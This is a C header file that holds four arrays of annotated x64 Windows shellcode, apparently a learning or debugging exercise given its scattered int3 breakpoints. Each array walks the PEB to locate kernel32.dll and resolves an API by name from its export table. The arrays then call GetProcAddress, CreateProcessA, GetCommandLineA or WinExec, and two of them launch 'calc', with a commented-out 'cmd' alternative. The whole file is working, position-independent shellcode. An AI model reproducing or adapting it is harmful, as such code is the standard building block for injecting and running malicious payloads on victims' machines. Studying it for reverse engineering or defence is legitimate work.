#pragma once
bool hello();
char ShellCode[] = 
"\xcc"
// Find kernel32.dll base address
"\x48\x31\xC9"              // xor rcx, rcx
"\x65\x48\x8B\x41\x60"      // mov rax, gs: [rcx + 0x60]    ; RAX = PEB
"\x48\x8B\x40\x18"          // mov rax, [rax + 0x18]        ; RAX = PEB->Ldr
"\x48\x8B\x70\x10"          // mov rsi, [rax + 0x10]        ; RSI = PEB->Ldr.InLoadOrder
"\x48\xAD"                  // lodsq                        ; RAX = Second module (lodsq == mov rax,QWORD PTR [rsi])
"\x48\x96"                  // xchg rax, rsi                ; RAX = RSI, RSI = RAX
"\x48\xAD"                  // lodsq                        ; RAX = Third(kernel32)
"\x48\x8B\x58\x30"          // mov rbx, [rax + 0x30]        ; RBX = Base address
// Find the export table of kernel32.dll
"\x48\x31\xD2"                      // xor rdx, rdx
"\x4D\x31\xC0"                      // xor r8, r8
"\x48\x31\xF6"                      // xor rsi, rsi
"\x8B\x53\x3C"                      // mov edx, [rbx + 0x3c]        ; RDX = DOS->e_lfanew
"\x49\x89\xD0"                      // mov r8, rdx
"\x48\x31\xD2"                      // xor rdx, rdx
"\x42\x8B\x94\x03\x88\x00\x00\x00"  // mov edx, [rbx + r8 + 0x88]   ; RDX = Offset export table
"\x49\x89\xD0"                      // mov r8, rdx
"\x48\x31\xD2"                      // xor rdx, rdx
"\x42\x8B\x54\x03\x20"              // mov edx, [rbx + r8 + 0x20]   ; RDX = Offset names table
"\x48\x31\xC9"                      // xor rcx, rcx                 ; RCX = 0

"\x48\x31\xF6"                          // xor rsi, rsi
"\x48\x31\xC0"                          // xor rax, rax
"\x48\x89\xD0"                          // mov rax, rdx
// Find GetProcAddress function name     
// Get_Function:
"\x8B\x34\x03"                          // mov esi, [rbx + rax]                          ; RSI = name offset
"\x48\xFF\xC1"                          // inc rcx                                      ; Increment the ordinal
"\x48\x83\xC0\x04"                      // add rax, 4                                    
"\x81\x3C\x33\x47\x65\x74\x50"          // cmp dword ptr[rbx + rsi], 0x50746547         ; GetP
"\x75\xED"                              // jnz Get_Function
"\x81\x7C\x33\x04\x72\x6F\x63\x41"      // cmp dword ptr[rbx + rsi + 0x4], 0x41636f72   ; rocA
"\x75\xE3"                              // jnz Get_Function
"\x81\x7C\x33\x08\x64\x64\x72\x65"      // cmp dword ptr[rbx + rsi + 0x8], 0x65726464   ; ddre
"\x75\xD9"                              // jnz Get_Function
"\xcc"

"\x48\x31\xD2"                          // xor rdx, rdx
"\x48\x31\xC0"                          // xor rax, rax
"\x42\x8B\x54\x03\x1C"                  // mov edx, [rbx + r8 + 0x1C]   ; RDX = Offset function table
"\x48\xFF\xC9"                          // dec rcx
"\x48\xC1\xE1\x02"                      // shl rcx, 2
"\x48\x01\xD1"                          // add rcx, rdx
"\x8B\x04\x0B"                          // mov eax, [rbx + rcx]
"\x48\x01\xD8"                          // add rax, rbx                  ; RDX = GetProcAddress ptr

"\xcc"
// GetProcAddress(kernel32_dll_baseaddr_ptr, loadlibrary)
"\x48\x31\xC9"                              // xor rcx, rcx; RCX = 0
"\x53"                                      // push rbx; Kernel32 base address
"\x50"                                      // push rax; GetProcAddress
"\x51"                                      // push rcx; 0

"\x48\xC7\xC1\x61\x72\x79\x41"              // mov rcx, 0x41797261; aryA
"\x51"                                      // push rcx; 

"\x48\xB9\x4C\x6F\x61\x64\x4C\x69\x62\x72"  // mov rcx, 0x7262694c64616f4c; LoadLibr
"\x51"                                      // push rcx; 
"\x48\x89\xE2"                              // mov rdx, rsp; argv[1]: "LoadLibrary"

"\x53"                                      // push rbx
"\x48\x89\xE1"                              // mov rcx, rsp; argv[0]: Kernel32 base address
"\xFF\xD0"                                  // call rax; GetProcAddress(LoadLibrary)
"\xcc"
;

char ShellCode_CreateProcessA[] =
"\xcc"
// Find kernel32.dll base address
"\x48\x31\xC9"              // xor rcx, rcx
"\x65\x48\x8B\x41\x60"      // mov rax, gs: [rcx + 0x60]    ; RAX = PEB
"\x48\x8B\x40\x18"          // mov rax, [rax + 0x18]        ; RAX = PEB->Ldr
"\x48\x8B\x70\x10"          // mov rsi, [rax + 0x10]        ; RSI = PEB->Ldr.InLoadOrder
"\x48\xAD"                  // lodsq                        ; RAX = Second module (lodsq == mov rax,QWORD PTR [rsi])
"\x48\x96"                  // xchg rax, rsi                ; RAX = RSI, RSI = RAX
"\x48\xAD"                  // lodsq                        ; RAX = Third(kernel32)
"\x48\x8B\x58\x30"          // mov rbx, [rax + 0x30]        ; RBX = Base address
// Find the export table of kernel32.dll
"\x48\x31\xD2"                      // xor rdx, rdx
"\x4D\x31\xC0"                      // xor r8, r8
"\x48\x31\xF6"                      // xor rsi, rsi
"\x8B\x53\x3C"                      // mov edx, [rbx + 0x3c]        ; RDX = DOS->e_lfanew
"\x49\x89\xD0"                      // mov r8, rdx
"\x48\x31\xD2"                      // xor rdx, rdx
"\x42\x8B\x94\x03\x88\x00\x00\x00"  // mov edx, [rbx + r8 + 0x88]   ; RDX = Offset export table
"\x49\x89\xD0"                      // mov r8, rdx
"\x48\x31\xD2"                      // xor rdx, rdx
"\x42\x8B\x54\x03\x20"              // mov edx, [rbx + r8 + 0x20]   ; RDX = Offset names table
"\x48\x31\xC9"                      // xor rcx, rcx                 ; RCX = 0

"\x48\x31\xF6"                          // xor rsi, rsi
"\x48\x31\xC0"                          // xor rax, rax
"\x48\x89\xD0"                          // mov rax, rdx
// Find GetProcAddress function name     
// Get_Function:
"\x8B\x34\x03"                          // mov esi, [rbx + rax]                         ; RSI = name offset
"\x48\xFF\xC1"                          // inc rcx                                      ; Increment the ordinal
"\x48\x83\xC0\x04"                      // add rax, 4                                    
"\x81\x3C\x33\x43\x72\x65\x61"          // cmp dword ptr[rbx + rsi], 0x61657243         ; Crea
"\x75\xED"                              // jnz Get_Function
"\x81\x7C\x33\x04\x74\x65\x50\x72"      // cmp dword ptr[rbx + rsi + 0x4], 0x72506574   ; tePr  
"\x75\xE3"                              // jnz Get_Function
"\x81\x7C\x33\x08\x6F\x63\x65\x73"      // cmp dword ptr[rbx + rsi + 0x8], 0x7365636f   ; oces
"\x75\xD9"                              // jnz Get_Function
"\x81\x7C\x33\x0A\x65\x73\x73\x41"   	// cmp dword ptr[rbx + rsi + 0xa], 0x41737365	; essA
"\x75\xCF"								// jnz Get_Function
"\xcc"

"\x48\x31\xD2"                          // xor rdx, rdx
"\x48\x31\xC0"                          // xor rax, rax
"\x42\x8B\x54\x03\x1C"                  // mov edx, [rbx + r8 + 0x1C]   ; RDX = Offset function table
"\x48\xFF\xC9"                          // dec rcx
"\x48\xC1\xE1\x02"                      // shl rcx, 2
"\x48\x01\xD1"                          // add rcx, rdx
"\x8B\x04\x0B"                          // mov eax, [rbx + rcx]
"\x48\x01\xD8"                          // add rax, rbx                 ; RAX = CreateProcessA ptr
"\xcc"
// CreateProcessA(NULL, "calc", NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
"\x48\x31\xC9"					// xor rcx, rcx			;argv[0]=0
"\x48\x31\xD2"					// xor rdx, rdx			
"\x4D\x31\xC0"					// xor r8, r8			;argv[2]=0
"\x4D\x31\xC9"					// xor r9, r9			;argv[3]=0
"\x48\xC7\xC2\x63\x61\x6C\x63"	// mov rdx, 0x636c6163
"\x52"							// push rdx
"\x48\x89\xE2"					// mov rdx, rsp			;argv[1]=&"calc"
"\x52"							// push rdx				;argv[9]=&"calc"
"\x52"							// push rdx				;argv[8]=&"calc"
"\x51"							// push rcx				;argv[7]=0
"\x51"							// push rcx				;argv[6]=0
"\x51"							// push rcx				;argv[5]=0
"\x51"							// push rcx				;argv[4]=0
"\xFF\xD0"// call rax
"\xcc"

;

char ShellCode_GetCommandLineA[] =
"\xcc"
// Find kernel32.dll base address
"\x48\x31\xC9"              // xor rcx, rcx
"\x65\x48\x8B\x41\x60"      // mov rax, gs: [rcx + 0x60]    ; RAX = PEB
"\x48\x8B\x40\x18"          // mov rax, [rax + 0x18]        ; RAX = PEB->Ldr
"\x48\x8B\x70\x10"          // mov rsi, [rax + 0x10]        ; RSI = PEB->Ldr.InLoadOrder
"\x48\xAD"                  // lodsq                        ; RAX = Second module (lodsq == mov rax,QWORD PTR [rsi])
"\x48\x96"                  // xchg rax, rsi                ; RAX = RSI, RSI = RAX
"\x48\xAD"                  // lodsq                        ; RAX = Third(kernel32)
"\x48\x8B\x58\x30"          // mov rbx, [rax + 0x30]        ; RBX = Base address
// Find the export table of kernel32.dll
"\x48\x31\xD2"                      // xor rdx, rdx
"\x4D\x31\xC0"                      // xor r8, r8
"\x48\x31\xF6"                      // xor rsi, rsi
"\x8B\x53\x3C"                      // mov edx, [rbx + 0x3c]        ; RDX = DOS->e_lfanew
"\x49\x89\xD0"                      // mov r8, rdx
"\x48\x31\xD2"                      // xor rdx, rdx
"\x42\x8B\x94\x03\x88\x00\x00\x00"  // mov edx, [rbx + r8 + 0x88]   ; RDX = Offset export table
"\x49\x89\xD0"                      // mov r8, rdx
"\x48\x31\xD2"                      // xor rdx, rdx
"\x42\x8B\x54\x03\x20"              // mov edx, [rbx + r8 + 0x20]   ; RDX = Offset names table
"\x48\x31\xC9"                      // xor rcx, rcx                 ; RCX = 0

"\x48\x31\xF6"                          // xor rsi, rsi
"\x48\x31\xC0"                          // xor rax, rax
"\x48\x89\xD0"                          // mov rax, rdx
// Find GetProcAddress function name     
// Get_Function:
"\x8B\x34\x03"                          // mov esi, [rbx + rax]                         ; RSI = name offset
"\x48\xFF\xC1"                          // inc rcx                                      ; Increment the ordinal
"\x48\x83\xC0\x04"                      // add rax, 4                                    
"\x81\x3C\x33\x47\x65\x74\x43"          // cmp dword ptr[rbx + rsi], 0x43746547         ; GetC
"\x75\xED"                              // jnz Get_Function
"\x81\x7C\x33\x04\x6F\x6D\x6D\x61"      // cmp dword ptr[rbx + rsi + 0x4], 0x616d6d6f   ; omma  
"\x75\xE3"                              // jnz Get_Function
"\x81\x7C\x33\x08\x6E\x64\x4C\x69"      // cmp dword ptr[rbx + rsi + 0x8], 0x694c646e   ; ndLi
"\x75\xD9"                              // jnz Get_Function
"\xcc"

"\x48\x31\xD2"                          // xor rdx, rdx
"\x48\x31\xC0"                          // xor rax, rax
"\x42\x8B\x54\x03\x1C"                  // mov edx, [rbx + r8 + 0x1C]   ; RDX = Offset function table
"\x48\xFF\xC9"                          // dec rcx
"\x48\xC1\xE1\x02"                      // shl rcx, 2
"\x48\x01\xD1"                          // add rcx, rdx
"\x8B\x04\x0B"                          // mov eax, [rbx + rcx]
"\x48\x01\xD8"                          // add rax, rbx                 ; RAX = GetCommandLineA ptr
"\xcc"
// GetCommandLineA()
"\xFF\xD0"// call rax
"\xcc"

;

char ShellCode_WinExec[] =
"\xcc"
// Find kernel32.dll base address
"\x48\x31\xC9"              // xor rcx, rcx
"\x65\x48\x8B\x41\x60"      // mov rax, gs: [rcx + 0x60]    ; RAX = PEB
"\x48\x8B\x40\x18"          // mov rax, [rax + 0x18]        ; RAX = PEB->Ldr
"\x48\x8B\x70\x10"          // mov rsi, [rax + 0x10]        ; RSI = PEB->Ldr.InLoadOrder
"\x48\xAD"                  // lodsq                        ; RAX = Second module (lodsq == mov rax,QWORD PTR [rsi])
"\x48\x96"                  // xchg rax, rsi                ; RAX = RSI, RSI = RAX
"\x48\xAD"                  // lodsq                        ; RAX = Third(kernel32)
"\x48\x8B\x58\x30"          // mov rbx, [rax + 0x30]        ; RBX = Base address
// Find the export table of kernel32.dll
"\x48\x31\xD2"                      // xor rdx, rdx
"\x4D\x31\xC0"                      // xor r8, r8
"\x48\x31\xF6"                      // xor rsi, rsi
"\x8B\x53\x3C"                      // mov edx, [rbx + 0x3c]        ; RDX = DOS->e_lfanew
"\x49\x89\xD0"                      // mov r8, rdx
"\x48\x31\xD2"                      // xor rdx, rdx
"\x42\x8B\x94\x03\x88\x00\x00\x00"  // mov edx, [rbx + r8 + 0x88]   ; RDX = Offset export table
"\x49\x89\xD0"                      // mov r8, rdx
"\x48\x31\xD2"                      // xor rdx, rdx
"\x42\x8B\x54\x03\x20"              // mov edx, [rbx + r8 + 0x20]   ; RDX = Offset names table
"\x48\x31\xC9"                      // xor rcx, rcx                 ; RCX = 0

"\x48\x31\xF6"                          // xor rsi, rsi
"\x48\x31\xC0"                          // xor rax, rax
"\x48\x89\xD0"                          // mov rax, rdx
// Find GetProcAddress function name     
// Get_Function:
"\x8B\x34\x03"                          // mov esi, [rbx + rax]                         ; RSI = name offset
"\x48\xFF\xC1"                          // inc rcx                                      ; Increment the ordinal
"\x48\x83\xC0\x04"                      // add rax, 4                                    
"\x81\x3C\x33\x57\x69\x6E\x45"          // cmp dword ptr[rbx + rsi], 0x456e6957         ; WinE
"\x75\xED"                              // jnz Get_Function
"\x81\x7C\x33\x03\x45\x78\x65\x63"      // cmp dword ptr[rbx + rsi + 0x3], 0x63657845   ; Exec  
"\x75\xE3"                              // jnz Get_Function
"\xcc"

"\x48\x31\xD2"                          // xor rdx, rdx
"\x48\x31\xC0"                          // xor rax, rax
"\x42\x8B\x54\x03\x1C"                  // mov edx, [rbx + r8 + 0x1C]   ; RDX = Offset function table
"\x48\xFF\xC9"                          // dec rcx
"\x48\xC1\xE1\x02"                      // shl rcx, 2
"\x48\x01\xD1"                          // add rcx, rdx
"\x8B\x04\x0B"                          // mov eax, [rbx + rcx]
"\x48\x01\xD8"                          // add rax, rbx                 ; RAX = WinExec ptr
"\xcc"
// WinExec("calc",1)
"\x48\x31\xD2"					// xor rdx, rdx
"\x48\x31\xC9"					// xor rcx, rcx
//"\x48\xC7\xC1\x63\x6D\x64\x00"	// mov rcx, 0x646d63 ;cmd
"\x48\xC7\xC1\x63\x61\x6c\x63"	// mov rcx, 0x636c6163 ;calc
"\x51"							// push rcx
"\x48\x89\xE1"					// mov rcx, rsp
"\x48\xFF\xC2"					// inc rdx
"\xFF\xD0"						// call rax
"\xcc"
;